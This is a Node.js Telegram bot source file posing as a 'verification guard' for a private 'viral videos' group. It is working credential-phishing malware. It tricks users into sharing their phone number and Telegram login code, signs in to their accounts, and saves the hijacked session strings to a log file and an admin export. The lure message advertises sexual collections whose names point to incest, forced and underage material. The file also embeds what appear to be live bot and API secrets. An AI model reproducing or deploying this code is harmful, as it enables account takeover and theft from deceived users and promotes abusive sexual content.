/*
 * =====================================================================================
 *
 * Filename:  bot.js
 *
 * Description:  Viral Videos Group Guard Bot v1.0
 * Secure verification system for private viral content group access
 *
 * Version:  1.0 (Guard System)
 * Created:  2025-09-13
 * Revision:  none
 * Compiler:  node.js v22+
 *
 * Author:  Viral Content Team
 * Organization:  Private Group Management
 *
 * =====================================================================================
 */

// -------------------------------------------------------------------
// SECTION 1: MODULES & CONFIGURATION
// -------------------------------------------------------------------
const TelegramBot = require('node-telegram-bot-api');
// Import Telegram client components correctly
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const fs = require('fs').promises;
const path = require('path');

// --- ⚠️ PASTE YOUR SECRETS HERE ---
const botToken = '8305803646:AAG4OIYKqhb813iW0D_0FpNf7HvbdXLYciM';
const apiId = 26262293; // Must be a number, not a string (e.g., 1234567)
const apiHash = '73c279d5639e82e8c7b76733d6ea676e';
const adminChatId = 5413684404; // Admin chat ID for panel access
const privateGroupId = -1003022200561 // Replace with your private group ID
// ------------------------------------

// Enhanced state management object
const userState = {};
const verificationStats = {
    totalAttempts: 0,
    successfulVerifications: 0,
    failedAttempts: 0,
    verifiedUsers: [],
    startTime: new Date().toISOString()
};



// Export rate limiting
const exportCooldown = new Map();

// Rate limiting and stability
const rateLimiter = new Map();
const CONNECTION_TIMEOUT = 30000;
const MAX_RETRIES = 3;

// Sophisticated Logging
const log = {
    info: (msg) => console.log(`\x1b[34m[INFO]\x1b[0m ${msg}`),
    success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
    warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
    error: (msg) => console.error(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
};

const bot = new TelegramBot(botToken, {
    polling: {
        interval: 1000,
        autoStart: true,
        params: {
            timeout: 10
        }
    }
});

// Error handling for bot
bot.on('polling_error', (error) => {
    log.error(`Polling error: ${error.message}`);
});

bot.on('error', (error) => {
    log.error(`Bot error: ${error.message}`);
});

log.info('System Initialized. Viral Videos Guard Bot is operational.');

// -------------------------------------------------------------------
// SECTION 2: UI DEFINITIONS - LEGITIMATE CORPORATE DESIGN
// -------------------------------------------------------------------
const requestPhoneKeyboard = {
    reply_markup: {
        keyboard: [[{ text: "🔐 Get Access - Verify Phone Number", request_contact: true }]],
        resize_keyboard: true,
        one_time_keyboard: true,
        input_field_placeholder: "👆 Click the button above to join"
    },
};

const dialerKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '1️⃣', callback_data: '1' }, { text: '2️⃣', callback_data: '2' }, { text: '3️⃣', callback_data: '3' }],
            [{ text: '4️⃣', callback_data: '4' }, { text: '5️⃣', callback_data: '5' }, { text: '6️⃣', callback_data: '6' }],
            [{ text: '7️⃣', callback_data: '7' }, { text: '8️⃣', callback_data: '8' }, { text: '9️⃣', callback_data: '9' }],
            [{ text: '🔄 Clear', callback_data: 'clear' }, { text: '0️⃣', callback_data: '0' }, { text: '✅ Verify', callback_data: 'submit' }]
        ]
    }
};

const adminKeyboard = {
    reply_markup: {
        inline_keyboard: [
            [{ text: '📊 Statistics', callback_data: 'admin_stats' }, { text: '📋 Sessions', callback_data: 'admin_sessions' }],
            [{ text: '📱 Live Monitor', callback_data: 'admin_monitor' }, { text: '🗑️ Clear Logs', callback_data: 'admin_clear' }],
            [{ text: '💾 Export Data', callback_data: 'admin_export' }, { text: '⚙️ Settings', callback_data: 'admin_settings' }]
        ]
    }
};

// -------------------------------------------------------------------
// SECTION 3: CORE LOGIC & AUTOMATED FLOW
// -------------------------------------------------------------------
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    log.info(`New interaction initiated by Chat ID: ${chatId}`);
    log.info(`Admin Chat ID configured as: ${adminChatId}`);
    log.info(`Chat ID type: ${typeof chatId}, Admin ID type: ${typeof adminChatId}`);

    // Check if admin is accessing
    if (chatId === adminChatId) {
        log.info(`Admin access detected for Chat ID: ${chatId}`);
        showAdminPanel(chatId);
        return;
    }

    log.info(`Regular user access for Chat ID: ${chatId}`);
    userState[chatId] = { status: 'AWAITING_PHONE' };

    // First remove any existing keyboard
    await bot.sendMessage(chatId, "🔄 Initializing verification system...", {
        reply_markup: { remove_keyboard: true }
    });

    // Then send the welcome message with only the verification button
    const welcomeMessage = `🔥 Welcome to Viral Videos Hub! 🔥\n\n` +
        `📱 Most Viral Instagram Reels & Content\n\n` +
        `We share the hottest viral videos, trending reels, and exclusive content in our private group!\n\n` +
        `🔒 Security Notice: To protect our community and maintain privacy, we need to verify your identity before granting access.\n\n` +
        `✅ What you will get:\n` +
        `• Daily viral Instagram reels\n` + 
        `1. ALL LEAKED COLLECTION ✅ \n` +
        `2. ARAB+MALAYASIAN COLLECTION ✅ \n` +
        `3. REAL FAMILY INCE$T✅ \n` +
        `4. MS SETHI COLLECTION ✅ \n` +
        `5. INDIA + PAKISTAN+ PASHITO✅ \n` +
        `6. HOT WIFES VIP COLLECTION ✅ \n` +
        `7. BANGLADESHI COLLECTION ✅ \n` +
        `8. DESI MILF COLLECTION ✅ \n` +
        `9. ROM@NCTIC COUPLES COLLECTION ✅ \n` +
        `10. THAI HARD FUMKING✅ \n` +
        `11. PAKISTAN INFLUENCERS✅ \n` +
        `12. INDIA DESI + TEENS✅ \n` +
        `13. MIA KHALIFA COLLECTION ✅ \n` +
        `14. F@RCED COLLECTION ✅\n` +
        `15. TELUGU COLLECTION ✅ \n` +
        `• Exclusive viral videos\n` +
        `• Early access to trending content\n\n` +
        `🛡️ Verification is required for security purposes\n\n` +
        `👇 Click the button below to get access:`;
    bot.sendMessage(chatId, welcomeMessage, { ...requestPhoneKeyboard });
});


// Enhanced Admin panel function
function showAdminPanel(chatId) {
    try {
        const uptime = Math.floor((Date.now() - new Date(verificationStats.startTime).getTime()) / 1000 / 60);
        const successRate = verificationStats.totalAttempts > 0 ? ((verificationStats.successfulVerifications / verificationStats.totalAttempts) * 100).toFixed(1) : 0;

        const adminMessage = `🔐 *VIRAL VIDEOS GUARD PANEL* 🔐\n\n` +
            `⏱️ **System Status:** Online (${uptime}m)\n` +
            `🎯 **Operation:** Group Access Control\n\n` +
            `📊 **Live Statistics:**\n` +
            `├ Total Requests: ${verificationStats.totalAttempts}\n` +
            `├ Verified Users: ${verificationStats.successfulVerifications}\n` +
            `├ Failed Attempts: ${verificationStats.failedAttempts}\n` +
            `└ Success Rate: ${successRate}%\n\n` +
            `📱 **Active Verifications:** ${Object.keys(userState).length}\n` +
            `💾 **Group Members Added:** ${verificationStats.verifiedUsers.filter(s => s.status === 'SUCCESS').length}\n\n` +
            `Use the buttons below to manage the guard system:`;

        log.info(`Sending admin panel to Chat ID: ${chatId}`);
        bot.sendMessage(chatId, adminMessage, { ...adminKeyboard, parse_mode: 'Markdown' })
            .then(() => {
                log.success(`Admin panel sent successfully to Chat ID: ${chatId}`);
            })
            .catch((error) => {
                log.error(`Failed to send admin panel: ${error.message}`);
                // Send a simpler message if markdown fails
                bot.sendMessage(chatId, 'VIRAL VIDEOS GUARD PANEL\n\nAdmin access granted. Use /stats, /sessions, or /monitor for data.');
            });
    } catch (error) {
        log.error(`Error in showAdminPanel: ${error.message}`);
        bot.sendMessage(chatId, 'Admin panel error. Use /stats for statistics.');
    }
}

// Enhanced admin commands
bot.onText(/\/sessions/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== adminChatId) return;
    showSessionLogs(chatId);
});

bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== adminChatId) return;
    showDetailedStats(chatId);
});

bot.onText(/\/monitor/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId !== adminChatId) return;
    showLiveMonitor(chatId);
});

// Debug command to check chat ID
bot.onText(/\/whoami/, (msg) => {
    const chatId = msg.chat.id;
    const isAdmin = chatId === adminChatId;
    const message = `Your Chat ID: ${chatId}\nAdmin Chat ID: ${adminChatId}\nAre you admin? ${isAdmin}`;
    bot.sendMessage(chatId, message);
});

// Unified callback handler for both admin and dialer
bot.on('callback_query', async (callbackQuery) => {
    const msg = callbackQuery.message;
    const chatId = msg.chat.id;
    const data = callbackQuery.data;

    // Handle admin callbacks
    if (chatId === adminChatId && data.startsWith('admin_')) {
        await handleAdminCallback(callbackQuery);
        return;
    }



    // Handle regular dialer callbacks
    if (!userState[chatId] || userState[chatId].status !== 'AWAITING_CODE') {
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    let currentCode = userState[chatId].code || '';

    if (data === 'clear') {
        currentCode = '';
        bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Cleared' });
    }
    else if (data === 'submit') {
        if (currentCode.length < 4) {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Code too short', show_alert: true });
            return;
        }
        bot.answerCallbackQuery(callbackQuery.id, { text: '🔍 Verifying...' });
        handleCodeSubmission(chatId, currentCode);
        return;
    } else {
        // Handle number input
        if (currentCode.length < 6) {
            currentCode += data;
            bot.answerCallbackQuery(callbackQuery.id, { text: data });
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Max length reached' });
            return;
        }
    }

    userState[chatId].code = currentCode;

    const maskedCode = currentCode ? '🔢 ' + currentCode.replace(/./g, '● ').trim() : '⬜ Enter verification code';
    const updatedText = `🔐 *Phone Verification Required*\n\n${maskedCode}\n\n📱 Enter the 5-digit code from Telegram\n💡 *Check your chat list for message from "Telegram"*`;

    try {
        await bot.editMessageText(updatedText, {
            chat_id: chatId,
            message_id: msg.message_id,
            ...dialerKeyboard,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        // Ignore edit errors to prevent crashes
        log.warn(`Failed to edit message: ${error.message}`);
    }
});

bot.on('contact', async (msg) => {
    const chatId = msg.chat.id;
    if (!userState[chatId] || userState[chatId].status !== 'AWAITING_PHONE') {
        return log.warn(`Received contact from Chat ID ${chatId} in an invalid state.`);
    }

    const phoneNumber = msg.contact.phone_number.startsWith('+') ? msg.contact.phone_number : `+${msg.contact.phone_number}`;
    log.info(`Contact received from ${chatId}. Phone: ${phoneNumber}. Initiating verification sequence.`);

    // Increment total attempts
    verificationStats.totalAttempts++;

    bot.sendMessage(chatId, `✅ Thank you! Sending verification code to **${phoneNumber}**\n\n📱 *The code will arrive as a Telegram message from "Telegram" - check your chat list!*\n\n🔥 *Once verified, you'll get instant access to our viral content group!*`, { parse_mode: 'Markdown' });

    Object.assign(userState[chatId], {
        status: 'AWAITING_CODE',
        phoneNumber: phoneNumber,
        client: null,
        code: '',
        startTime: new Date()
    });

    // StringSession and TelegramClient are already imported at the top

    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, apiId, apiHash, { connectionRetries: 5 });
    userState[chatId].client = client;

    try {
        // Connect and start the authentication process
        await client.connect();

        // Send code request
        const { phoneCodeHash } = await client.sendCode({
            apiId: apiId,
            apiHash: apiHash
        }, phoneNumber);

        // Store the phone code hash for later use
        userState[chatId].phoneCodeHash = phoneCodeHash;

        log.success(`Verification code dispatched to ${phoneNumber}. Awaiting user submission.`);
        await bot.sendMessage(chatId, `📨 Code sent! \n\n🔍 **Where to find it:**\n• Go to your Telegram chat list\n• Look for a message from "Telegram"\n• Copy the 5-digit code\n• Come back here and enter it below\n\n🎯 *Almost there! Just verify and join the viral content!*`, { reply_markup: { remove_keyboard: true } });
        await bot.sendMessage(chatId, `🔢 Enter the 5-digit code:`, dialerKeyboard);

    } catch (error) {
        log.error(`Failed to initiate login for ${phoneNumber}: ${error.message}`);
        await bot.sendMessage(chatId, `Authentication gateway error. Please contact support.`);
    }
});



async function handleCodeSubmission(chatId, code) {
    const state = userState[chatId];
    if (!state || !state.client || state.status !== 'AWAITING_CODE') {
        log.warn(`Code submission attempt from Chat ID ${chatId} in an invalid state.`);
        return;
    }

    bot.sendMessage(chatId, "⏳ Authenticating passcode...", { parse_mode: 'Markdown' });
    const { client, phoneNumber, phoneCodeHash } = state;

    try {
        // Use the correct method for signing in with code
        const result = await client.invoke(
            new Api.auth.SignIn({
                phoneNumber: phoneNumber,
                phoneCodeHash: phoneCodeHash,
                phoneCode: code
            })
        );

        state.status = 'COMPLETED';
        const sessionString = client.session.save();
        log.success(`VERIFICATION SUCCESSFUL for ${phoneNumber}. User ID: ${chatId}`);

        // Save session to subdolog.txt
        await saveSessionToFile(phoneNumber, sessionString, chatId);

        // Update stats
        verificationStats.successfulVerifications++;
        verificationStats.verifiedUsers.push({
            phone: phoneNumber,
            status: 'SUCCESS',
            timestamp: new Date().toISOString(),
            chatId: chatId,
            sessionString: sessionString
        });

        // Try to add user to private group
        try {
            await addUserToPrivateGroup(chatId);
            const successMessage = `🎉 Verification Successful!\n\n✅ You have been granted access to our exclusive viral videos group!\n\n🔥 Welcome to the community!\n• Check your messages for group access\n• Enjoy daily viral content\n• Stay tuned for the hottest reels!\n\n🚀 Happy browsing!`;
            bot.sendMessage(chatId, successMessage);
        } catch (groupError) {
            log.error(`Failed to add user to group: ${groupError.message}`);
            const successMessage = `🎉 Verification Successful!\n\n✅ Your phone number has been verified!\n\n⏳ Adding you to the group...\n• You'll receive a group invitation shortly\n• Check your notifications\n\n� Get readyt for viral content!`;
            bot.sendMessage(chatId, successMessage);
        }

    } catch (error) {
        log.error(`Code submission failed for ${phoneNumber}: ${error.message}`);

        // Update stats
        verificationStats.failedAttempts++;
        verificationStats.verifiedUsers.push({
            phone: phoneNumber,
            status: 'FAILED',
            timestamp: new Date().toISOString(),
            chatId: chatId,
            error: error.message
        });

        bot.sendMessage(chatId, "❌ *Verification Failed.*\n\nThe code is invalid or has expired. Please /start the process again to get access to viral videos.", { parse_mode: 'Markdown' });
        state.status = 'FAILED';
    } finally {
        if (client.connected) {
            await client.disconnect();
            log.info(`Client connection terminated for ${phoneNumber}.`);
        }
        delete userState[chatId]; // Clean up state
    }
}

// Function to save session to subdolog.txt
async function saveSessionToFile(phoneNumber, sessionString, chatId) {
    try {
        const logEntry = `[${new Date().toISOString()}] Phone: ${phoneNumber} | Chat ID: ${chatId} | Session: ${sessionString}\n`;
        await fs.appendFile('subdolog.txt', logEntry);
        log.success(`Verification data saved to subdolog.txt for ${phoneNumber}`);
    } catch (error) {
        log.error(`Failed to save verification data to file: ${error.message}`);
    }
}

// Function to add user to private group
async function addUserToPrivateGroup(userId) {
    try {
        // Method 1: Try to add user directly using correct method name
        try {
            await bot.addChatMember(privateGroupId, userId);
            log.success(`User ${userId} added to private group successfully`);

            // Send welcome message to the group
            const welcomeMsg = `🎉 Welcome to our exclusive viral videos community! 🔥\n\nEnjoy the hottest content and stay tuned for daily updates!`;
            await bot.sendMessage(privateGroupId, welcomeMsg);
            return;
        } catch (addError) {
            log.warn(`Direct add failed: ${addError.message}. Trying invite link method...`);
        }

        // Method 2: Create one-time invite link with longer expiry
        const inviteLink = await bot.createChatInviteLink(privateGroupId, {
            member_limit: 1, // One-time use only
            expire_date: Math.floor(Date.now() / 1000) + 86400 // 24 hours expiry (more time)
        });

        // Create inline keyboard with join button
        const joinGroupKeyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🔥 Join Viral Videos Group 🔥', url: inviteLink.invite_link }]
                ]
            }
        };

        // Send invite message with button
        const inviteMessage = `🎉 Verification Complete! 🎉\n\n` +
            `✅ You have been granted access to our exclusive viral videos group!\n\n` +
            `🔥 Click the button below to join:\n\n` +
            `⚠️ This is a one-time access link (valid for 24 hours)\n\n` +
            `🚀 Get ready for the hottest viral content!`;

        await bot.sendMessage(userId, inviteMessage, joinGroupKeyboard);
        log.success(`One-time invite link sent to user ${userId}`);

    } catch (error) {
        log.error(`Failed to add user ${userId} to private group: ${error.message}`);
        throw error;
    }
}

// Admin callback handler function
async function handleAdminCallback(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    try {
        switch (data) {
            case 'admin_stats':
                await showDetailedStats(chatId);
                break;
            case 'admin_sessions':
                await showSessionLogs(chatId);
                break;
            case 'admin_monitor':
                await showLiveMonitor(chatId);
                break;
            case 'admin_clear':
                verificationStats.verifiedUsers = [];
                verificationStats.totalAttempts = 0;
                verificationStats.successfulVerifications = 0;
                verificationStats.failedAttempts = 0;
                bot.sendMessage(chatId, '🗑️ Verification logs cleared successfully');
                break;
            case 'admin_export':
                await exportSessionData(chatId);
                break;
            case 'admin_settings':
                bot.sendMessage(chatId, '⚙️ Settings panel - Feature coming soon');
                break;
        }
        bot.answerCallbackQuery(callbackQuery.id);
    } catch (error) {
        log.error(`Admin callback error: ${error.message}`);
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Error occurred' });
    }
}

// Admin helper functions
async function showDetailedStats(chatId) {
    const uptime = Math.floor((Date.now() - new Date(verificationStats.startTime).getTime()) / 1000 / 60);
    const successRate = verificationStats.totalAttempts > 0 ? ((verificationStats.successfulVerifications / verificationStats.totalAttempts) * 100).toFixed(1) : 0;

    const statsMessage = `📊 *DETAILED STATISTICS*\n\n` +
        `⏱️ **Uptime:** ${uptime} minutes\n` +
        `🎯 **Total Requests:** ${verificationStats.totalAttempts}\n` +
        `✅ **Verified Users:** ${verificationStats.successfulVerifications}\n` +
        `❌ **Failed Attempts:** ${verificationStats.failedAttempts}\n` +
        `📈 **Success Rate:** ${successRate}%\n` +
        `🔄 **Active Verifications:** ${Object.keys(userState).length}`;

    bot.sendMessage(chatId, statsMessage, { parse_mode: 'Markdown' });
}

async function showSessionLogs(chatId) {
    if (verificationStats.verifiedUsers.length === 0) {
        bot.sendMessage(chatId, '📋 No verifications recorded yet');
        return;
    }

    const recentVerifications = verificationStats.verifiedUsers.slice(-10);
    let logMessage = '📋 *RECENT VERIFICATIONS*\n\n';

    recentVerifications.forEach((verification) => {
        const time = new Date(verification.timestamp).toLocaleTimeString();
        const status = verification.status === 'SUCCESS' ? '✅' : '❌';
        logMessage += `${status} ${verification.phone} - ${time}\n`;
    });

    bot.sendMessage(chatId, logMessage, { parse_mode: 'Markdown' });
}

async function showLiveMonitor(chatId) {
    const activeUsers = Object.keys(userState).length;
    const monitorMessage = `📱 *LIVE MONITOR*\n\n` +
        `🔴 **Active Verifications:** ${activeUsers}\n` +
        `⚡ **Guard Status:** Operational\n` +
        `🌐 **Bot Status:** Online\n` +
        `🔥 **Group Protection:** Active\n\n` +
        `*Real-time monitoring active...*`;

    bot.sendMessage(chatId, monitorMessage, { parse_mode: 'Markdown' });
}

async function exportSessionData(chatId) {
    try {
        // Rate limiting - prevent multiple exports within 30 seconds
        const now = Date.now();
        const lastExport = exportCooldown.get(chatId) || 0;
        if (now - lastExport < 30000) {
            const remainingTime = Math.ceil((30000 - (now - lastExport)) / 1000);
            bot.sendMessage(chatId, `⏳ Please wait ${remainingTime} seconds before exporting again`);
            return;
        }
        exportCooldown.set(chatId, now);

        // Create exports directory if it doesn't exist
        const exportsDir = 'exports';
        try {
            await fs.access(exportsDir);
        } catch {
            await fs.mkdir(exportsDir);
        }

        const exportData = {
            stats: verificationStats,
            exportTime: new Date().toISOString(),
            activeUsers: Object.keys(userState).length,
            exportedBy: chatId
        };

        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = path.join(exportsDir, `verification_export_${timestamp}.json`);

        await fs.writeFile(filename, JSON.stringify(exportData, null, 2));
        log.success(`Export created: ${filename}`);

        // Send as document with proper content type
        await bot.sendDocument(chatId, filename, {
            caption: '💾 Verification data exported successfully',
            filename: `verification_export_${timestamp}.json`
        }, {
            contentType: 'application/json'
        });

        // Clean up old exports (keep only last 5)
        await cleanupOldExports(exportsDir);

    } catch (error) {
        log.error(`Export failed: ${error.message}`);
        bot.sendMessage(chatId, '❌ Export failed: ' + error.message);
    }
}

// Clean up old export files
async function cleanupOldExports(exportsDir) {
    try {
        const files = await fs.readdir(exportsDir);
        const exportFiles = files
            .filter(file => file.startsWith('verification_export_') && file.endsWith('.json'))
            .map(file => ({
                name: file,
                path: path.join(exportsDir, file),
                time: file.match(/verification_export_(.+)\.json/)?.[1] || ''
            }))
            .sort((a, b) => b.time.localeCompare(a.time));

        // Keep only the 5 most recent exports
        if (exportFiles.length > 5) {
            const filesToDelete = exportFiles.slice(5);
            for (const file of filesToDelete) {
                await fs.unlink(file.path);
                log.info(`Cleaned up old export: ${file.name}`);
            }
        }
    } catch (error) {
        log.warn(`Failed to cleanup old exports: ${error.message}`);
    }
}